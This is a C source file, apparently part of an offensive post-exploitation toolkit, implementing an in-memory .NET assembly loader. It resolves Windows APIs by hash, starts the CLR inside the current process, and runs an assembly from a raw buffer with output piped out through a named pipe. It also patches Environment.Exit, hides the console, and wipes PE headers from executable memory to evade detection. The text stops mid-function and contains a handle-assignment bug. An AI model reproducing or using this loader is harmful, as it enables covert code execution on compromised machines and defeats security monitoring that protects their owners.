#include "common.h"

//#define _ERROR
//#define _VERBOSE

D_SEC( B ) VOID WINAPI ExecuteAssembly( _In_ LPVOID Data )
{
    API                             Api;
    CLR                             Clr;
    OLS                             Ols;
    UNICODE_STRING                  Uni;

    HWND                            Wnd = NULL;
    HANDLE                          Out = NULL;
    HANDLE                          Log = NULL;

    NTSTATUS                        Nst = STATUS_SUCCESS;
    HRESULT                         Hrs = S_OK;
    DWORD                           Idx = 0;

    PVOID                           Ntd = NULL;
    PVOID                           K32 = NULL;
    PVOID                           Msc = NULL;
    PVOID                           Mvc = NULL;
    PVOID                           Ole = NULL;
    PVOID                           Shl = NULL;
    PVOID                           U32 = NULL;
    BOOL                            MLd = FALSE;
    BOOL                            VLd = FALSE;
    BOOL                            OLd = FALSE;
    BOOL                            SLd = FALSE;
    BOOL                            ULd = FALSE;

    PCHAR                           PipStr = NULL;
    PCHAR                           LenStr = NULL;
    PCHAR                           AsmStr = NULL;
    PCHAR                           ArgStr = NULL;
    INT                             PipSiz = 0;
    INT                             LenSiz = 0;
    INT                             AsmSiz = 0;
    INT                             ArgSiz = 0;

    BOOL                            Loadable;
    PWCHAR                          NetVersion = NULL;
    PWCHAR                          ModuleName = NULL;
    PWCHAR                          AppDomain = NULL;
    PPEB                            Peb = NULL;
    PRTL_USER_PROCESS_PARAMETERS    PebPrm = NULL;

    ULONG                           OldProtA;
    ULONG                           OldProtB;
    SIZE_T                          NumBytes;
    INT_PTR                         BaseIPtr;
    INT_PTR                         ExitIPtr;
    BYTE                            OrigData;

    PVOID                           SrchAddr;
    PBYTE                           SrchBuff;
    BYTE                            CurrChar;
    INT                             CurrSrch;
    INT                             Position;
    LPVOID                          ProcMin;
    MEMORY_BASIC_INFORMATION        MemInfo = { 0 };
    SYSTEM_INFO                     SysInfo = { 0 };


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Clr, sizeof( Clr ) );
    RtlSecureZeroMemory( &Ols, sizeof( Ols ) );

    K32 = PebGetModule( H_LIB_KERNEL32 );
    Msc = PebGetModule( H_LIB_MSCOREE );
    Mvc = PebGetModule( H_LIB_MSVCRT );
    Ntd = PebGetModule( H_LIB_NTDLL );
    Ole = PebGetModule( H_LIB_OLE32 );
    Shl = PebGetModule( H_LIB_SHELL32 );
    U32 = PebGetModule( H_LIB_USER32 );

    Api.LdrLoadDll                  = PeGetFuncEat( Ntd, H_API_LDRLOADDLL );
    Api.LdrUnloadDll                = PeGetFuncEat( Ntd, H_API_LDRUNLOADDLL );
    Api.RtlAllocateHeap             = PeGetFuncEat( Ntd, H_API_RTLALLOCATEHEAP );
    Api.RtlFreeHeap                 = PeGetFuncEat( Ntd, H_API_RTLFREEHEAP );
    Api.RtlInitUnicodeString        = PeGetFuncEat( Ntd, H_API_RTLINITUNICODESTRING );
    Api.vsnprintf                   = PeGetFuncEat( Ntd, H_API_VSNPRINTF );
    Api.NtClose                     = PeGetFuncEat( Ntd, H_API_NTCLOSE );
    Api.NtProtectVirtualMemory      = PeGetFuncEat( Ntd, H_API_NTPROTECTVIRTUALMEMORY );
    Api.NtQueryVirtualMemory        = PeGetFuncEat( Ntd, H_API_NTQUERYVIRTUALMEMORY );

    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    if ( Msc == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"mscoree.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &Msc );
        if ( Msc == NULL ) goto cleanup;
        MLd = TRUE;
    };
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    if ( Ole == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"oleaut32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &Ole );
        if ( Ole == NULL ) goto cleanup;
        OLd = TRUE;
    };
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    if ( Shl == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"shell32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &Shl );
        if ( Shl == NULL ) goto cleanup;
        SLd = TRUE;
    };
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    if ( U32 == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"user32.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &Shl );
        if ( U32 == NULL ) goto cleanup;
        ULd = TRUE;
    };
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    if ( Mvc == NULL )
    {
        Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"msvcrt.dll" ) ) );
        Api.LdrLoadDll( NULL, 0, &Uni, &Mvc );
        if ( Mvc == NULL ) goto cleanup;
        VLd = TRUE;
    };
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

    Api.AllocConsole                = PeGetFuncEat( K32, H_API_ALLOCCONSOLE );
    Api.CreateNamedPipeA            = PeGetFuncEat( K32, H_API_CREATENAMEDPIPEA );
    Api.VirtualAlloc                = PeGetFuncEat( K32, H_API_VIRTUALALLOC );
    Api.ConnectNamedPipe            = PeGetFuncEat( K32, H_API_CONNECTNAMEDPIPE );
    Api.FreeConsole                 = PeGetFuncEat( K32, H_API_FREECONSOLE );
    Api.GetConsoleWindow            = PeGetFuncEat( K32, H_API_GETCONSOLEWINDOW );
    Api.SetStdHandle                = PeGetFuncEat( K32, H_API_SETSTDHANDLE );
    Api.GetSystemInfo               = PeGetFuncEat( K32, H_API_GETSYSTEMINFO );
    Api.MultiByteToWideChar         = PeGetFuncEat( K32, H_API_MULTIBYTETOWIDECHAR );
    Api.VirtualFree                 = PeGetFuncEat( K32, H_API_VIRTUALFREE );
    Api.WaitForSingleObject         = PeGetFuncEat( K32, H_API_WAITFORSINGLEOBJECT );
    Api.WriteFile                   = PeGetFuncEat( K32, H_API_WRITEFILE );
    Api.GetStdHandle                = PeGetFuncEat( K32, H_API_GETSTDHANDLE );
    Api.CLRCreateInstance           = PeGetFuncEat( Msc, H_API_CLRCREATEINSTANCE );
    Api.SafeArrayCreate             = PeGetFuncEat( Ole, H_API_SAFEARRAYCREATE );
    Api.SafeArrayDestroy            = PeGetFuncEat( Ole, H_API_SAFEARRAYDESTROY );
    Api.SafeArrayUnaccessData       = PeGetFuncEat( Ole, H_API_SAFEARRAYUNACCESSDATA );
    Api.SafeArrayAccessData         = PeGetFuncEat( Ole, H_API_SAFEARRAYACCESSDATA );
    Api.SysAllocString              = PeGetFuncEat( Ole, H_API_SYSALLOCSTRING );
    Api.SysFreeString               = PeGetFuncEat( Ole, H_API_SYSFREESTRING );
    Api.SafeArrayGetUBound          = PeGetFuncEat( Ole, H_API_SAFEARRAYGETUBOUND );
    Api.SafeArrayCreateVector       = PeGetFuncEat( Ole, H_API_SAFEARRAYCREATEVECTOR );
    Api.SafeArrayPutElement         = PeGetFuncEat( Ole, H_API_SAFEARRAYPUTELEMENT );
    Api.SafeArrayGetLBound          = PeGetFuncEat( Ole, H_API_SAFEARRAYGETLBOUND );
    Api.CommandLineToArgvW          = PeGetFuncEat( Shl, H_API_COMMANDLINETOARGVW );
    Api.ShowWindow                  = PeGetFuncEat( U32, H_API_SHOWWINDOW );

    GUID C_MH = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
    GUID I_MH = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
    GUID C_RH = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
    GUID I_RH = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
    GUID I_AD = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
    GUID I_RI = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };

    CHAR netv4[] = "\x76\x34\x2E\x30\x2E\x33\x30\x33\x31\x39";
    BYTE header[] = "\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    cpymem( &PipSiz,
            Data,
            sizeof( PipSiz ) + 1
            );
    if ( PipSiz == 0 ) goto cleanup;

    PipStr = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                  HEAP_ZERO_MEMORY,
                                  PipSiz
                                  );
    cpymem( PipStr,
            Data + sizeof( PipSiz ) + 1,
            PipSiz
            );
    if ( PipStr == NULL ) goto cleanup;

    cpymem( &LenSiz,
            Data + sizeof( PipSiz ) + 1 + PipSiz,
            sizeof( LenSiz ) + 1
            );
    if ( LenSiz == 0 ) goto cleanup;

    LenStr = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                  HEAP_ZERO_MEMORY,
                                  LenSiz
                                  );
    cpymem( LenStr,
            Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1,
            LenSiz
            );
    if ( LenStr == NULL ) goto cleanup;

    cpymem( &AsmSiz,
            Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz,
            sizeof( AsmSiz ) + 1
            );
    if ( AsmSiz == 0 ) goto cleanup;

    AsmStr = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                  HEAP_ZERO_MEMORY,
                                  AsmSiz
                                  );
    cpymem( AsmStr,
            Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1,
            AsmSiz
            );
    if ( AsmStr == NULL ) goto cleanup;

    cpymem( &ArgSiz,
            Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1 + AsmSiz,
            sizeof( ArgSiz ) + 1
            );
    if ( ArgSiz == 0 ) goto cleanup;

    ArgStr = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                HEAP_ZERO_MEMORY,
                                ArgSiz
                                );
    cpymem( ArgStr,
            Data + sizeof( PipSiz ) + 1 + PipSiz + sizeof( LenSiz ) + 1 + LenSiz + sizeof( AsmSiz ) + 1 + AsmSiz + sizeof( ArgSiz ) + 1,
            ArgSiz
            );
    if ( ArgStr == NULL ) goto cleanup;

    Clr.LN = custatoi( LenStr ) + 1;
    if ( LenStr != NULL )
    {
        RtlSecureZeroMemory( LenStr, LenSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        LenStr
                        );
        LenStr = NULL;
    };
    Log = PipeInit( &Api, ( PCHAR )PipStr );
    if ( PipStr != NULL )
    {
        RtlSecureZeroMemory( PipStr, PipSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        PipStr
                        );
        PipStr = NULL;
    };

    if ( Log != INVALID_HANDLE_VALUE )
    {
        if ( PipeWait( &Api, Log ) )
        {
            if ( Api.GetConsoleWindow() == NULL )
            {
                Api.AllocConsole();
                Wnd = Api.GetConsoleWindow();
                if ( Wnd != NULL )
                {
                    Api.ShowWindow( Wnd, SW_HIDE );
                };
            };

            Out = Api.GetStdHandle( STD_OUTPUT_HANDLE );
            Api.SetStdHandle( STD_OUTPUT_HANDLE, Log );

            Clr.V1.vt = VT_NULL;
            Clr.V1.plVal = NULL;
            Hrs = Api.CLRCreateInstance( &C_MH, &I_MH, ( LPVOID* )&Clr.MH );
            if ( Hrs != S_OK ) {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error CLRCreateInstance : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            // https://github.com/anthemtotheego/InlineExecute-Assembly/blob/main/src/inlineExecute-Assembly.c#L110
            NetVersion = L"v2.0.50727";
            for ( int i = 0; i < AsmSiz; i++ )
            {
                for ( int j = 0; j < 10; j++ )
                {
                    if ( netv4[j] != AsmStr[i + j] )
                    {
                        break;
                    }
                    else
                    {
                        if ( j == ( 9 ) )
                        {
                            NetVersion = L"v4.0.30319";
                        };
                    };
                };
            };
            if ( netv4 != NULL )
            {
                RtlSecureZeroMemory( netv4, sizeof( netv4 ) );
            };

            Hrs = Clr.MH->lpVtbl->GetRuntime( Clr.MH, NetVersion, &I_RI, ( PVOID* )&Clr.RI );
            if ( Hrs != S_OK )
            {
                goto incompatible;
            };
            /*Hrs = Clr.RI->lpVtbl->IsLoaded( Clr.RI, NtCurrentProcess(), &Loaded );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error RuntimeInfo.IsLoaded : %lx\n", Hrs );
#endif
            };*/
            Hrs = Clr.RI->lpVtbl->IsLoadable( Clr.RI, &Loadable );
            if ( Hrs != S_OK || !Loadable )
            {
                goto incompatible;
            };
            Hrs = Clr.RI->lpVtbl->GetInterface( Clr.RI, &C_RH, &I_RH, ( PVOID* )&Clr.RH );
            if ( Hrs != S_OK )
            {
incompatible:
                PipePrint( &Api, Log, "[-] Incompatible .NET Framework version\n" );
                goto cleanup;
            };

            Hrs = Clr.RH->lpVtbl->Start( Clr.RH );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error starting CLR : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
            PebPrm = Peb->ProcessParameters;
            if ( Peb == NULL || PebPrm == NULL )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error retrieving file name info\n" );
#endif
                goto cleanup;
            };
            ModuleName = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                  HEAP_ZERO_MEMORY,
                                  _MAX_FNAME
                                  );
            AppDomain = Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                  HEAP_ZERO_MEMORY,
                                  _MAX_FNAME
                                  );
            if ( ModuleName == NULL || AppDomain == NULL )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error allocating heap memory for appdomain name\n" );
#endif
                goto cleanup;
            };
            if ( PebPrm->ImagePathName.Buffer != NULL )
            {
                cpymem( ModuleName, PebPrm->ImagePathName.Buffer, PebPrm->ImagePathName.Length );
                if ( ModuleName != NULL && AppDomain != NULL )
                {
                    splitpathw( ModuleName, AppDomain );
                }
                else
                {
#ifdef _ERROR
                    PipePrint( &Api, Log, "Error splitting path name\n" );
#endif
                    goto cleanup;
                };
            }
            else
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error reading ImagePathName.Buffer info\n" );
#endif
                goto cleanup;
            };

#ifdef _VERBOSE
            PipePrint( &Api, Log, "[+] AppDomain name: %ws\n", AppDomain );
#endif

            Hrs = Clr.RH->lpVtbl->CreateDomain( Clr.RH, AppDomain, NULL, &Clr.AD );
            //Hrs = Clr.RH->lpVtbl->GetDefaultDomain( Clr.RH, &Clr.AD );
            if ( Hrs != S_OK )
            {
                if ( Hrs == E_OUTOFMEMORY )
                {
                    PipePrint( &Api, Log, "[-] Not enough memory in target process, please select another\n" );
                }
                else
                {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error CreateDomain : %lx\n", Hrs );
#endif
                };

                goto cleanup;
            };

            if ( ModuleName != NULL )
            {
                RtlSecureZeroMemory( ModuleName, _MAX_FNAME );
                Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                0,
                                ModuleName
                                );
                ModuleName = NULL;
            };
            if ( AppDomain != NULL )
            {
                RtlSecureZeroMemory( AppDomain, _MAX_FNAME );
                Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                0,
                                AppDomain
                                );
                AppDomain = NULL;
            };

            Hrs = Clr.AD->lpVtbl->QueryInterface( Clr.AD, &I_AD, ( void** )&Clr.DA );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error QueryInterface 2 : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            Clr.SB[0].cElements = Clr.LN;
            Clr.SB[0].lLbound = 0;
            Clr.PS = ( SAFEARRAY* )Api.SafeArrayCreate( VT_UI1, 1, Clr.SB );
            Api.SafeArrayAccessData( Clr.PS, &Clr.PD );
            cpymem( Clr.PD, AsmStr, Clr.LN );
            Api.SafeArrayUnaccessData( Clr.PS );
            if ( AsmStr != NULL )
            {
                RtlSecureZeroMemory( AsmStr, AsmSiz );
                Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                            0,
                            AsmStr
                            );
                AsmStr = NULL;
            };

            Hrs = Clr.DA->lpVtbl->Load_3( Clr.DA, Clr.PS, ( _Assembly** )&Clr.AS );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error Load_3 : %lx\n", Hrs );
#endif
                goto cleanup;
            };
            RtlSecureZeroMemory( Clr.PS, sizeof( SAFEARRAY ) );
            Api.SafeArrayDestroy( Clr.PS );

            Ols.Mscorlib = Api.SysAllocString( L"mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" );
            Hrs = Clr.DA->lpVtbl->Load_2( Clr.DA, Ols.Mscorlib, &Clr.MS );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Load_2( mscorlib ) : %lx %p\n", Hrs, ( PVOID )Clr.MS );
#endif
                goto cleanup;
            };
            if ( Ols.Mscorlib != NULL )
            {
                Api.SysFreeString( Ols.Mscorlib );
                Ols.Mscorlib = NULL;
            };

            Ols.System_Environment = Api.SysAllocString( L"System.Environment" );
            Hrs = Clr.MS->lpVtbl->GetType_2( Clr.MS, Ols.System_Environment, &Clr.SE );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "GetType_2( System.Environment ) : %lx %p\n", Hrs, ( PVOID )Clr.SE );
#endif
                goto cleanup;
            };
            if ( Ols.System_Environment != NULL )
            {
                Api.SysFreeString( Ols.System_Environment );
                Ols.System_Environment = NULL;
            };

            Ols.Exit = Api.SysAllocString( L"Exit" );
            Hrs = Clr.SE->lpVtbl->GetMethod_2( Clr.SE, Ols.Exit, BindingFlags_Static | BindingFlags_Public, &Clr.EX );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "System.GetMethod( Environment.Exit ) : %lx : %p\n", Hrs, ( PVOID )Clr.EX );
#endif
                goto cleanup;
            };
            if ( Ols.Exit != NULL )
            {
                Api.SysFreeString( Ols.Exit );
                Ols.Exit = NULL;
            };

            Ols.System_Reflection_MethodInfo = Api.SysAllocString( L"System.Reflection.MethodInfo" );
            Hrs = Clr.MS->lpVtbl->GetType_2( Clr.MS, Ols.System_Reflection_MethodInfo, &Clr.MI );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "GetType_2( System.Reflection.MethodInfo ) : %lx %p\n", Hrs, ( PVOID )Clr.MI );
#endif
                goto cleanup;
            };
            if ( Ols.System_Reflection_MethodInfo != NULL )
            {
                Api.SysFreeString( Ols.System_Reflection_MethodInfo );
                Ols.System_Reflection_MethodInfo = NULL;
            };

            Ols.MethodInfo = Api.SysAllocString( L"MethodHandle" );
            Hrs = Clr.MI->lpVtbl->GetProperty( Clr.MI, Ols.MethodInfo, BindingFlags_Static | BindingFlags_Instance | BindingFlags_Public, &Clr.HA );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
               PipePrint( &Api, Log, "GetProperty( MethodHandle ) : %lx : %p\n", Hrs, ( PVOID )Clr.HA );
#endif
               goto cleanup;
            };
            if ( Ols.MethodInfo != NULL )
            {
                Api.SysFreeString( Ols.MethodInfo );
                Ols.MethodInfo = NULL;
            };

            Clr.V2.vt = VT_UNKNOWN;
            Clr.V2.punkVal = Clr.EX;
            Clr.ID = Api.SafeArrayCreateVector( VT_EMPTY, 0, 0 );
            Hrs = Clr.HA->lpVtbl->GetValue( Clr.HA, Clr.V2, Clr.ID, &Clr.V3 );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "GetValue( MethodHandle ) : %lx : %p\n", Hrs, ( PVOID )Clr.V3.byref );
#endif
                goto cleanup;
            };
            Api.SafeArrayDestroy( Clr.ID );

            Ols.System_RuntimeMethodHandle = Api.SysAllocString( L"System.RuntimeMethodHandle" );
            Hrs = Clr.MS->lpVtbl->GetType_2( Clr.MS, Ols.System_RuntimeMethodHandle, &Clr.RM );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "GetType_2( System.RuntimeMethodHandle ) : %lx %p\n", Hrs, ( PVOID )Clr.RM );
#endif
                goto cleanup;
            };
            if ( Ols.System_RuntimeMethodHandle != NULL )
            {
                Api.SysFreeString( Ols.System_RuntimeMethodHandle );
                Ols.System_RuntimeMethodHandle = NULL;
            };

            Ols.GetFunctionPointer = Api.SysAllocString( L"GetFunctionPointer" );
            Hrs = Clr.RM->lpVtbl->GetMethod_2( Clr.RM, Ols.GetFunctionPointer, BindingFlags_Instance | BindingFlags_Public, &Clr.FP );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "GetMethod_2( GetFunctionPointer ) : %lx %p\n", Hrs, ( PVOID )Clr.FP );
#endif
                goto cleanup;
            };
            if ( Ols.GetFunctionPointer != NULL )
            {
                Api.SysFreeString( Ols.GetFunctionPointer );
                Ols.GetFunctionPointer = NULL;
            };

            Clr.FA = Api.SafeArrayCreateVector( VT_EMPTY, 0, 0 );
            RtlSecureZeroMemory( &Clr.V2, sizeof( VARIANT ) );
            Clr.V1.vt = VT_NULL;
            Clr.V1.plVal = NULL;

            Hrs = Clr.FP->lpVtbl->Invoke_3( Clr.FP, Clr.V3, Clr.FA, &Clr.V2 );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Invoke_3( GetFunctionPointer ) : %lx %p\n", Hrs, ( PVOID )Clr.V2.byref );
#endif
                goto cleanup;
            };
            Api.SafeArrayDestroy( Clr.FA );

            NumBytes = 1;
            ExitIPtr = ( PVOID )Clr.V2.byref;
            BaseIPtr = ( PVOID )Clr.V2.byref;
            if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &BaseIPtr, &NumBytes, PAGE_READWRITE, &OldProtA ) ) )
            {
                OrigData = *( ( byte* )ExitIPtr );
                *( byte* )ExitIPtr = 0xc3;

                if ( !NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &BaseIPtr, &NumBytes, OldProtA, &OldProtB ) ) )
                {
#ifdef _ERROR
                    PipePrint( &Api, Log, "Second VirtualProtectEx failed\n" );
#endif
                };
            }
            else
            {
                PipePrint( &Api, Log, "[-] Unable to patch Environment.Exit()!\n" );
            };

            Hrs = Clr.AS->lpVtbl->get_EntryPoint( Clr.AS, ( _MethodInfo** )&Clr.EN );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error get_EntryPoint : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            Hrs = Clr.EN->lpVtbl->GetParameters( Clr.EN, &Clr.AR );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error GetParameters : %lx\n", Hrs );
#endif
                goto cleanup;
            };
            Hrs = Api.SafeArrayGetLBound( Clr.AR, 1, &Clr.LC );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error SafeArrayGetLBound : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            Hrs = Api.SafeArrayGetUBound( Clr.AR, 1, &Clr.UC );
            if ( Hrs != S_OK )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error SafeArrayGetUBound : %lx\n", Hrs );
#endif
                goto cleanup;
            };

            RtlSecureZeroMemory( &Clr.V1, sizeof( VARIANT ) );
            RtlSecureZeroMemory( &Clr.V2, sizeof( VARIANT ) );
            RtlSecureZeroMemory( &Clr.V3, sizeof( VARIANT ) );

            Clr.V1.vt = VT_NULL;
            Clr.V1.plVal = NULL;

            Clr.CT = Clr.UC - Clr.LC + 1;
            if ( Clr.CT != 0 )
            { 
                Clr.PR = Api.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
                if ( cmpstr( ArgStr, "NOARGS" ) != 0 )
                {
                    Api.MultiByteToWideChar( CP_ACP, 0, ArgStr, -1, Clr.BF, 256 );
                    Clr.AL = Api.CommandLineToArgvW( Clr.BF, &Clr.AC );
                    Clr.V3.vt = ( VT_ARRAY | VT_BSTR );
                    Clr.V3.parray = Api.SafeArrayCreateVector( VT_BSTR, 0, Clr.AC );

                    for ( Idx = 0; Idx < Clr.AC; Idx++ )
                    {  
                        Api.SafeArrayPutElement( Clr.V3.parray, &Idx, Api.SysAllocString( Clr.AL[Idx] ) );
                    };
                }
                else
                {
                    Clr.V3.vt = ( VT_ARRAY | VT_BSTR );
                    Clr.SB[0].lLbound = 0;
                    Clr.SB[0].cElements = 0;
                    Clr.V3.parray = Api.SafeArrayCreate( VT_BSTR, 1, Clr.SB );
                    Clr.SB[0].cElements = 1;
                    Clr.PR = Api.SafeArrayCreate( VT_VARIANT, 1, Clr.SB );
                    
                };
                Idx = 0;
                Api.SafeArrayPutElement( Clr.PR, &Idx, &Clr.V3 );
                Api.SafeArrayDestroy( Clr.V3.parray );
            }
            else
            {
                Clr.PR = Api.SafeArrayCreateVector( VT_EMPTY, 0, 0 );
            };

            if ( ArgStr != NULL )
            {
                RtlSecureZeroMemory( ArgStr, ArgSiz );
                Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                                0,
                                ArgStr
                                );
                ArgStr = NULL;
            };

            Api.GetSystemInfo( &SysInfo );
            if ( SysInfo.lpMinimumApplicationAddress == 0 )
            {
#ifdef _ERROR
                PipePrint( &Api, Log, "Error getting system info\n" );
#endif
                goto postwipe;
            };
            ProcMin = SysInfo.lpMinimumApplicationAddress;
            while ( ProcMin < SysInfo.lpMaximumApplicationAddress )
            {
                if ( !NT_SUCCESS( ( Api.NtQueryVirtualMemory( NtCurrentProcess(), ProcMin, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), NULL ) ) ) )
                {
#ifdef _ERROR
                    PipePrint( &Api, Log, "Error querying memory info\n" );
#endif
                    goto next;
                };
                if ( MemInfo.State == MEM_COMMIT && ( MemInfo.Protect == PAGE_EXECUTE_READWRITE || MemInfo.Protect == PAGE_EXECUTE_READ ) )
                {
                    SrchBuff = ( PBYTE )Api.RtlAllocateHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap, 0, MemInfo.RegionSize );
                    cpymem( SrchBuff, MemInfo.BaseAddress, MemInfo.RegionSize );

                    Position = 0;
                    CurrSrch = 0;
                    CurrChar;
                    SrchAddr = NULL;
                    NumBytes = 4096;
                    while( Position <= MemInfo.RegionSize )
                    {
                        CurrChar = SrchBuff[Position];
                        Position++;

                        if ( CurrChar == header[CurrSrch] )
                        {
                            CurrSrch++;
                            if ( CurrSrch == ADATA_SIZE( header ) && Position < NumBytes )
                            {
                                CurrSrch = 0;
                                SrchAddr = MemInfo.BaseAddress + Position - ADATA_SIZE( header ) - 4;
                                if ( *( PBYTE )SrchAddr == 0x4d )
                                {
#ifdef _VERBOSE
                                    PipePrint( &Api, Log, "[+] Found PE header at 0x%p in region 0x%p\n", SrchAddr, MemInfo.BaseAddress );
#endif
                                    Nst = Api.NtProtectVirtualMemory( NtCurrentProcess(), &MemInfo.BaseAddress, &NumBytes, PAGE_EXECUTE_WRITECOPY, &OldProtA );
                                    if ( !NT_SUCCESS( Nst ) )
                                    {
#ifdef _ERROR
                                        PipePrint( &Api, Log, "Error changing memory protection: 0x%lx\nOld prot: 0x%x\n", Nst, OldProtA );
#endif
                                        goto next;
                                    };
                                    RtlSecureZeroMemory( ( PVOID )( SrchAddr       ), 2  ); // MZ
                                    RtlSecureZeroMemory( ( PVOID )( SrchAddr + 60  ), 4  ); // e_lfanew
                                    RtlSecureZeroMemory( ( PVOID )( SrchAddr + 64  ), 66 ); // DOS
                                    RtlSecureZeroMemory( ( PVOID )( SrchAddr + 256 ), 4  ); // Rich
                                    RtlSecureZeroMemory( ( PVOID )( SrchAddr + 288 ), 2  ); // PE
                                    if ( !NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &MemInfo.BaseAddress, &NumBytes, OldProtA, &OldProtB ) ) )
                                    {
#ifdef _ERROR
                                        PipePrint( &Api, Log, "Error restoring PE header memory protection\n" );
#endif
                                        goto next;
                                    };
                                };
                            };
                        }
                        else
                        {
                            CurrSrch = 0;
                        };
                    };
                    if ( SrchBuff != NULL )
                    {
next:
                        RtlSecureZeroMemory( SrchBuff, MemInfo.RegionSize );
                        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap, 0, SrchBuff );
                    };
                };
                ProcMin += MemInfo.RegionSize;
            };

postwipe:
            if ( header != NULL )
            {
                RtlSecureZeroMemory( header, sizeof( header ) );
            };

